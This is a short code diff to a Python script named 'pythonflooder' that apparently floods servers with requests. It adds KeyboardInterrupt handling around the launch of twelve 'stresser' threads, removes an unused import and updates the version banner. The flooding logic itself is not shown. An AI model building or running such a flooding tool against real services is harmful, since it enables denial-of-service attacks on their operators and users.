@@ -4,7 +4,7 @@ import requests
 
 from os import system
 from time import sleep
-from sys import exit, platform
+from sys import exit
 
 
 def stresser():
@@ -37,37 +37,40 @@ def stresser():
 
 
 def _threads_():
-    c = threading.Thread(target=stresser)
-    d = threading.Thread(target=stresser)
-    a = threading.Thread(target=stresser)
-    e = threading.Thread(target=stresser)
-    z = threading.Thread(target=stresser)
-    x = threading.Thread(target=stresser)
-    c1 = threading.Thread(target=stresser)
-    d1 = threading.Thread(target=stresser)
-    a1 = threading.Thread(target=stresser)
-    e1 = threading.Thread(target=stresser)
-    z1 = threading.Thread(target=stresser)
-    x1 = threading.Thread(target=stresser)
+    try:
+        c = threading.Thread(target=stresser)
+        d = threading.Thread(target=stresser)
+        a = threading.Thread(target=stresser)
+        e = threading.Thread(target=stresser)
+        z = threading.Thread(target=stresser)
+        x = threading.Thread(target=stresser)
+        c1 = threading.Thread(target=stresser)
+        d1 = threading.Thread(target=stresser)
+        a1 = threading.Thread(target=stresser)
+        e1 = threading.Thread(target=stresser)
+        z1 = threading.Thread(target=stresser)
+        x1 = threading.Thread(target=stresser)
 
-    c.start()
-    d.start()
-    a.start()
-    e.start()
-    z.start()
-    x.start()
-    c1.start()
-    d1.start()
-    a1.start()
-    e1.start()
-    z1.start()
-    x1.start()
+        c.start()
+        d.start()
+        a.start()
+        e.start()
+        z.start()
+        x.start()
+        c1.start()
+        d1.start()
+        a1.start()
+        e1.start()
+        z1.start()
+        x1.start()
+    except KeyboardInterrupt:
+        exit()
 
 
 def main():
     system("cls")
     print("========================")
-    print("pythonflooder v1.0.1.")
+    print("pythonflooder v1.0.2")
     print("author: frostyworks")
     print("========================")
     sleep(2)
